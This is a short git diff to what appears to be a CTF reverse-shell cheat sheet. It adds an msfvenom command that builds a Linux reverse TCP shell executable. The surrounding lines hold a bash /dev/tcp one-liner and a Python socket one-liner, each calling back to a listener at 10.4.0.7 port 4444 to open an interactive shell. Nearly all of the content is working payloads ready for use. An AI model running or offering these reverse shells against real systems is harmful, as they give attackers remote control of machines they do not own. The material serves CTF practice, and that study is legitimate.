@@ -16,6 +16,10 @@ Pure bash if /dev/tcp is available (rare on CTFs):
 
 `bash -i >& /dev/tcp/10.4.0.7/4444 0>&1`
 
+Via msfvenom (still calling back to a nc listener), creating an executable called connect:
+
+`msfvenom -p linux/x64/shell_reverse_tcp lhost=10.4.0.7 lport=4444 > connect`
+
 Python, especially useful if you have python rce by default (in which case just use the contents of the quoted string):
 
 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.0.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
